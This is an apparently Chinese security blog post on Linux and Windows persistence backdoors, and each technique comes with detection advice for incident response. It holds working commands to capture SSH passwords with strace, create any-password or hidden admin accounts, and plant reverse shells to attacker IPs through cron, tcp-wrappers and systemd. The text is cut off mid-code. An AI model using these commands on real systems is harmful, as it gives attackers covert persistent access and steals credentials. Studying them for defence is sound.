    <link href="/blog/2023/09/23/Windows-Linux%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/"/>
    <url>/blog/2023/09/23/Windows-Linux%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>当拿下一台服务器，为达到长久控制的目的，如何结合系统自身的某些特性，达到持久化控制的效果呢？<strong>知其白，守其黑，为天下式</strong>，在应急响应的过程中，又该如何尽早地排查出这些后门？</p><p><img src="/images/fj68.jpg"></p><span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="strace获取登录凭证"><a href="#strace获取登录凭证" class="headerlink" title="strace获取登录凭证"></a>strace获取登录凭证</h3><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>凭证将会通过strace追踪到系统sshd进程，并将追踪到的信息保存到log文件，这些信息中包含了系统明文密码以及ssh私钥。</p><p>1.查看sshd的进程pid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ps -ef | grep sshd<br>root        887      1  0 01:04 ?        00:00:00 /usr/sbin/sshd -D<br></code></pre></td></tr></table></figure><p>2.strace跟踪进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo strace -f -p 887 -o /tmp/.ssh.log -e trace=<span class="hljs-built_in">read</span>,write -s 4096<br>strace: Process 887 attached<br></code></pre></td></tr></table></figure><p>3.等待相应的用户使用ssh登录，strace捕获到的凭证将会保存在&#x2F;tmp&#x2F;.ssh.log文件下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> .ssh.log | grep <span class="hljs-string">&quot;write(4&quot;</span><br>2049  write(4, <span class="hljs-string">&quot;\0\0\0@\6&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1\0\0\0 \5\262\210\334A\260l5\335\224\362\344\347\225;\324\226\215_\235\231\302\37\233\3\257b=\266&#125;\213\340\0\0\0\23ecdsa-sha2-nistp256&quot;</span>, 63) = 63<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\10\10&quot;</span>, 5)       = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1d&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\33\4&quot;</span>, 5)        = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0&quot;</span>, 26) = 26<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\v\f&quot;</span>, 5)         = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\006123456&quot;</span>, 10)  = 10 <span class="hljs-comment">#look here</span><br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1f&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\6\5\32&quot;</span>, 5)        = 5<br><br></code></pre></td></tr></table></figure><p>也可以直接把第1、2步骤的命令合并到一条：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo strace -f -p `ps -ef | grep <span class="hljs-string">&quot;sshd -D&quot;</span>|grep -v grep | awk &#123;<span class="hljs-string">&#x27;print $2&#x27;</span>&#125;` -o /tmp/.ssh.log -e trace=<span class="hljs-built_in">read</span>,write -s 4096<br></code></pre></td></tr></table></figure><h4 id="检查此类后门"><a href="#检查此类后门" class="headerlink" title="检查此类后门"></a>检查此类后门</h4><p>可以通过ps 等命令查看是否存在strace进程在监控sshd，如果存在及时kill，并将该命令写入的log及时删除</p><h4 id="其他骚操作"><a href="#其他骚操作" class="headerlink" title="其他骚操作"></a>其他骚操作</h4><p>可以在bashrc中给常用命令起别名，运行时自动启用strace抓取口令，针对此类要检查一下bashrc有没有可疑的alias，或者使用alias工具检查有没有可疑的别名，或者创建高权限用户</p><h3 id="SSH软连接后门"><a href="#SSH软连接后门" class="headerlink" title="SSH软连接后门"></a>SSH软连接后门</h3><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），su在pam_rootok只检测uid 0即认证成功，导致了可以使用任意密码登录。</p><p>直接启动&#x2F;usr&#x2F;sbin&#x2F;sshd,默认使用&#x2F;etc&#x2F;pam.d&#x2F;sshd的pam配置文件，因而不能建立任意密码登录的后门。而通过软链接的方式，实质上PAM认证是通过软链接的文件名（如：&#x2F;usr&#x2F;local&#x2F;su），在&#x2F;etc&#x2F;pam.d&#x2F;目录下寻找对应的PAM配置文件(如：&#x2F;etc&#x2F;pam.d&#x2F;su)。</p><h4 id="留后门-1"><a href="#留后门-1" class="headerlink" title="留后门"></a>留后门</h4><ol><li>sshd服务需要启用PAM认证机制，在&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件中，设置UsePAM 为yes。如果不启用PAM，系统严格验证用户密码，不能建立后门。</li><li>&#x2F;etc&#x2F;pam.d&#x2F;目录下，对应文件里包含”auth sufficient pam_rootok.so”配置，只要PAM配置文件中包含此配置即可SSH任意密码登录</li></ol><p>受害者主机上运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=9999<br></code></pre></td></tr></table></figure><p>攻击者主机上运行ssh连接命令指定上述端口即可，输入密码是任意填写即可以root身份登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@x.x.x.x -p 9999<br>root@x.x.x.x<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Last login: Sat Sep 23 03:40:29 2023 from x.x.x.x</span><br><span class="hljs-string">root@ubuntu:~# exit</span><br></code></pre></td></tr></table></figure><h4 id="检测后门"><a href="#检测后门" class="headerlink" title="检测后门"></a>检测后门</h4><p>1.查看系统当前端口状态。</p><p>这类后门会开启监听端口，我们可以先查看&#x2F;etc&#x2F;pam.d&#x2F;目录下有哪些文件包含该配置，然后通过管道符找到异常端口及进程，再通过进程找到异常文件、杀掉进程、关闭PAM认证即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/pam.d/ | xargs grep <span class="hljs-string">&quot;pam_rootok.so&quot;</span><br>netstat -antlp |grep -E <span class="hljs-string">&quot;su|chsh|chfn|runuser&quot;</span><br></code></pre></td></tr></table></figure><p>2.查看系统登录日志</p><p>使用last系列命令检查是否有异常的登录</p><h3 id="SSH公钥免密登录"><a href="#SSH公钥免密登录" class="headerlink" title="SSH公钥免密登录"></a>SSH公钥免密登录</h3><h4 id="留后门-2"><a href="#留后门-2" class="headerlink" title="留后门"></a>留后门</h4><p>将攻击机的公钥写入.ssh&#x2F;authorized_keys文件中，即可利用公钥免密登录靶机</p><h4 id="检测后门-1"><a href="#检测后门-1" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查.ssh&#x2F;authorized_keys文件的变动，检查系统当前登录状态和登录记录</p><h3 id="SSH-Wrapper后门"><a href="#SSH-Wrapper后门" class="headerlink" title="SSH Wrapper后门"></a>SSH Wrapper后门</h3><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是13377就执行sh给个shell.</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断</p><h4 id="留后门-3"><a href="#留后门-3" class="headerlink" title="留后门"></a>留后门</h4><p>靶机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/sbin/<br><span class="hljs-built_in">mv</span> sshd ../bin/    <span class="hljs-comment">#对sshd程序做备份</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt; sshd <span class="hljs-comment"># 4A对应的是端口号13377，十六进制3441，转ASCII就是4A</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt; sshd<br><span class="hljs-built_in">chmod</span> u+x sshd<br>/etc/init.d/ssh restart<br></code></pre></td></tr></table></figure><p>攻击机连接：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> STDIO TCP4:<span class="hljs-number">192.168.52.132:22</span>,sourceport=<span class="hljs-number">13377</span><br></code></pre></td></tr></table></figure><h4 id="检测后门-2"><a href="#检测后门-2" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查sshd文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /usr/sbin/sshd<br><span class="hljs-built_in">cat</span> /usr/sbin/sshd<br></code></pre></td></tr></table></figure><p>如果有修改异常，可以选择清除后门重新安装ssh服务</p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><h4 id="留后门-4"><a href="#留后门-4" class="headerlink" title="留后门"></a>留后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">生成密码： openssl passwd -1 -salt admin 123456 <br>-1 的意思是使用md5crypt加密算法 <br>-salt 指定盐为admin <br>123456 明文密码<br>然后将生成的密码按照规则写入/etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><h4 id="检测后门-3"><a href="#检测后门-3" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查&#x2F;etc&#x2F;passwd文件中有没有最近修改，有没有可疑的用户</p><h3 id="Cron计划任务"><a href="#Cron计划任务" class="headerlink" title="Cron计划任务"></a>Cron计划任务</h3><h4 id="留后门-5"><a href="#留后门-5" class="headerlink" title="留后门"></a>留后门</h4><p>攻击者将恶意代码或程序隐藏在系统磁盘中，并由计划任务调用时启动它们</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab-l; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;*/1 * * * * /bin/bash/ tmp/1.sh;/bin/bash --noprofile -i&#x27;</span>) | crontab -<br></code></pre></td></tr></table></figure><p>这种普通的后门可以用<code>crontab -l</code>轻松检查出来，更高阶一点的是利用cat工具的特性，cat默认支持一些如\r回车符、\n换行符、\f换页符等，也就是这些符号导致的能够隐藏命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab -l; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;*/1 * * * * bash-i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1; /bin/bash --noprofile -i;\rno crontab for`whoami`%100c\n&quot;</span>) | crontab -<br></code></pre></td></tr></table></figure><h4 id="检测后门-4"><a href="#检测后门-4" class="headerlink" title="检测后门"></a>检测后门</h4><ol><li>使用<code>crontab -e</code>检查编辑计划任务</li><li>使用vim等文本编辑工具检查cron计划任务创建的文件</li></ol><h3 id="SUID-Shell后门"><a href="#SUID-Shell后门" class="headerlink" title="SUID Shell后门"></a>SUID Shell后门</h3><p><a href="https://chujian521.github.io/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/">SUID权限</a>前面的博客有过介绍，简单来说就是拥有该权限的可执行程序在执行时会以文件拥有者身份执行</p><h4 id="留后门-6"><a href="#留后门-6" class="headerlink" title="留后门"></a>留后门</h4><p>复制bash程序到某个目录，并为其增加root用户的SUID权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /tmp/shell<br><span class="hljs-built_in">chmod</span> u+s /tmp/shell<br></code></pre></td></tr></table></figure><p>普通用户执行<code>/tmp/shell -p</code>即可以root权限执行命令（但是此时我们的身份依然是原来的身份，uid没有变，但是有root的权限，euid&#x3D;0）</p><h4 id="检测后门-5"><a href="#检测后门-5" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查SUID设置的文件<code>find . -perm /4000</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -perm /4000<br>./bash<br></code></pre></td></tr></table></figure><p>然后删除或者取消SUID权限<code>chmod u-s ./bash</code></p><h3 id="Tcp-wrapper后门"><a href="#Tcp-wrapper后门" class="headerlink" title="Tcp wrapper后门"></a>Tcp wrapper后门</h3><p>TCPWrappers是一个工作在第四层（传输层）的的安全工具，对有状态连接的特定服务进行安全检测并实现访问控制，凡是包含libwrap.so库文件的的程序就可以受TCPWrappers的安全控制。它的主要功能就是控制谁可以访问，常见的程序有rpcbind、vsftpd、sshd，telnet。通过修改配置文件hosts.allow，实现tcpd（Tcp Wrapper的守护进程）每当有ssh等的连接请求时，如若请求满足配置文件中的规则即可触发命令的执行。</p><h4 id="留后门-7"><a href="#留后门-7" class="headerlink" title="留后门"></a>留后门</h4><p>TCP_Wrappers的使用主要是依靠两个配置文件&#x2F;etc&#x2F;hosts.allow, &#x2F;etc&#x2F;hosts.deny，用于拒绝和接受。之所以能够被用作后门是因为他存在一个参数是spawn （spawn启动一个外部程序完成执行的操作）</p><p>我们可以修改allow配置，追加以下规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ALL: ALL: spawn (bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/your_ip/6666 0&gt;&amp;1&quot;</span>) &amp; :allow<br></code></pre></td></tr></table></figure><p>然后攻击机监听端口即可：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p>可以使用ssh尝试连接即可触发</p><h4 id="检测后门-6"><a href="#检测后门-6" class="headerlink" title="检测后门"></a>检测后门</h4><p>检测&#x2F;etc&#x2F;hosts.allow, &#x2F;etc&#x2F;hosts.deny文件中有没有恶意命令执行的规则，如有删除恶意的代码</p><h3 id="Systemd服务后门"><a href="#Systemd服务后门" class="headerlink" title="Systemd服务后门"></a>Systemd服务后门</h3><h4 id="留后门-8"><a href="#留后门-8" class="headerlink" title="留后门"></a>留后门</h4><p>在<code>/etc/systemd/system</code>目录下新建.service文件，并赋予可执行权限，内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=System bash<br><span class="hljs-attr">After</span>=network.target<br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=forking<br><span class="hljs-attr">ExecStart</span>=/home/user/re.sh<br><span class="hljs-attr">ExecReload</span>=<br><span class="hljs-attr">ExecStop</span>=<br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>其中<code>/home/user/re.sh</code>的内容为反弹shell命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.20/9999 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>启动服务后即可收到反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">netcat -lvp 9999<br>Listening on [0.0.0.0] (family 0, port 9999)<br>Connection from 192.168.1.20 61971 received!<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (3195): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@ubuntu:/<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="检查后门"><a href="#检查后门" class="headerlink" title="检查后门"></a>检查后门</h4><p>检查<code>/etc/systemd/system</code>、<code>/usr/lib/systemd/system</code>目录下有没有可疑的服务并删除恶意代码</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>对于在Windows Vista和Windows Server 2008 及更高的版本中，替换的二进制文件受到了系统的保护，无法使用经典的shift后门（直接替换相应的系统程序为恶意程序）。”映像劫持”，也被称为”IFEO”，Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。</p><h4 id="留后门-9"><a href="#留后门-9" class="headerlink" title="留后门"></a>留后门</h4><p>当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序。在注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>目录下新建<code>sethc.exe</code>项目（也可以替换成其他的常用的），然后在该项目下新建字符串键值<code>&quot;debugger&quot;=&quot;C:\\Windows\\System32\\cmd.exe&quot;</code>，路径为恶意程序路径。</p><p>下次用户使用sethc.exe时就会触发恶意程序执行</p><h4 id="检测后门-7"><a href="#检测后门-7" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution </code>注册表项中有没有可疑的debugger键值</p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>DLL劫持指病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</p><p>DLL(动态链接库)作为 windows 的函数库，有助于促进代码的模块化、代码重用、有效的内存使用并减少磁盘空间；一个应用程序运行时可能需要依赖于多个 DLL 的函数才能完成功能，如果控制其中任一 DLL，那么便可以控制该应用程序的执行流程。</p><p>桌面程序目前默认的DLL加载顺序为<a href="https://learn.microsoft.com/en-us/windows/win32/DLLs/dynamic-link-library-search-order">Dynamic-link library search order - Win32 apps | Microsoft Learn</a></p><h4 id="留后门-10"><a href="#留后门-10" class="headerlink" title="留后门"></a>留后门</h4><p>生成恶意的DLL文件，并且通过函数转发调用原始的DLL函数，完全不会影响应用程序的运行。可以选择劫持某应用程序特有的DLL，我们使用恶意 DLL 替换目标文件，然后再将原始 DLL 重命名并放置在应用程序同目录下(以便函数转发可以顺利进行)，当应用程序启动时就可以加载我们的恶意 DLL。当然也可以针对公共的DLL进行劫持，由于公共DLL可能被其他应用加载到内存，所以可能需要重启才能生效，具体DLL劫持可以参考<a href="https://www.freebuf.com/articles/network/288943.html">dll 劫持和应用研究 - FreeBuf网络安全行业门户</a></p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>防御主要靠应用开发者对加载的DLL进行校验，从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题</p><p>检查可以使用Process Monitor查看应用加载的DLL，分析导入导出DLL。使用自动化检测工具<a href="https://github.com/sensepost/rattler">sensepost&#x2F;rattler: Automated DLL Enumerator (github.com)</a></p><h3 id="注册表开机自启动项"><a href="#注册表开机自启动项" class="headerlink" title="注册表开机自启动项"></a>注册表开机自启动项</h3><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下：</p><ol><li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li><li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li></ol><p>常见注册表启动项键的位置：</p><p>用户级</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure><p>系统级</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure><h4 id="留后门-11"><a href="#留后门-11" class="headerlink" title="留后门"></a>留后门</h4><p>在上述启动项位置新建字符串值，写入恶意的程序启动命令键值即可</p><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>检查以上注册表启动位置有没有可疑的启动项</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>windows下定时任务的命令有两个分别是：<code>at</code>和<code>schtasks</code>，他们两者主要区别是<code>at</code>命令在<code>win7</code>、<code>08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code>schtasks</code>是将定时的任务在前台执行</p><h4 id="留后门-12"><a href="#留后门-12" class="headerlink" title="留后门"></a>留后门</h4><p>AT命令（win10已经弃用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AT [\\computername] time [/INTERACTIVE]<br>    [ /EVERY:<span class="hljs-built_in">date</span>[,...] | /NEXT:<span class="hljs-built_in">date</span>[,...]] <span class="hljs-string">&quot;command&quot;</span><br></code></pre></td></tr></table></figure><p>schtasks命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | <span class="hljs-string">&quot;System&quot;</span>&#125; [/rp Password]] /?<br></code></pre></td></tr></table></figure><h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><p>schtasks 命令可以查看所有计划任务，查看有没有可疑的计划任务</p><h3 id="注册表用户登录初始化"><a href="#注册表用户登录初始化" class="headerlink" title="注册表用户登录初始化"></a>注册表用户登录初始化</h3><p><code>Userinit</code>的作用是用户在进行登陆初始化设置时，<code>WinLogon</code>进程会执行指定的<code>login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p><h4 id="留后门-13"><a href="#留后门-13" class="headerlink" title="留后门"></a>留后门</h4><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>注册表项中有个Userinit项，其中值为逗号分隔的启动项，我们可以在里面添加后门程序的启动</p><h4 id="检测-3"><a href="#检测-3" class="headerlink" title="检测"></a>检测</h4><p>检查注册表Userinit是否有可疑的初始化项</p><h3 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h3><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p><h4 id="留后门-14"><a href="#留后门-14" class="headerlink" title="留后门"></a>留后门</h4><p>可以使用metasploit框架注册一个服务，运行之后msf会在<code>%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code>metsvc.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code></p><h4 id="检测-4"><a href="#检测-4" class="headerlink" title="检测"></a>检测</h4><p>检查服务中有没有可疑的启动项，检查服务开放的端口</p><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><h4 id="留后门-15"><a href="#留后门-15" class="headerlink" title="留后门"></a>留后门</h4><ol><li>在用户名后面加一个<code>$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span>$ 123456 /add<br>net localgroup administrators <span class="hljs-built_in">test</span>$ /add<br></code></pre></td></tr></table></figure><p>这样我们就创建了一个隐藏账户并加入管理员组，密码为123456</p><ol start="2"><li><p>打开注册表，定位到<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>（如果没有编辑权限可以先赋予当前用户administrator的具有完全控制和读取权限）</p></li><li><p>查看administrator对应的键值为1f4和隐藏账户test$的键值为3e9，然后在Users中找到对应数字的F值，将3e9的F值替换为1f4的F值，将00003e9和<code>test$</code>按顺序导出为1.reg和2.reg</p></li><li><p>然后删除用户，<code>net user test$ /del</code></p></li><li><p>按顺序导入刚才导出的注册表文件</p></li></ol><h4 id="检测-5"><a href="#检测-5" class="headerlink" title="检测"></a>检测</h4><p>检查注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names用户是否与 lusrmgr.msc 中的用户是否一致</p><h3 id="CLR劫持"><a href="#CLR劫持" class="headerlink" title="CLR劫持"></a>CLR劫持</h3><p>CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。<code>CLR</code>能够劫持系统中全部<code>.net</code>程序，而且系统默认会调用<code>.net</code>程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路。</p><h4 id="留后门-16"><a href="#留后门-16" class="headerlink" title="留后门"></a>留后门</h4><p>修改注册表添加表项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;GGUUGGUU-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-AABBCCDDEEFF&#125;\InProcServer32&quot; /VE /T REG_SZ /D &quot;C:\Windows\System32\test.dll&quot; /F<br><br>REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;GGUUGGUU-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-AABBCCDDEEFF&#125;\InProcServer32&quot; /V ThreadingModel /T REG_SZ /D Apartment /F<br></code></pre></td></tr></table></figure><p>使用msf创建dll后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 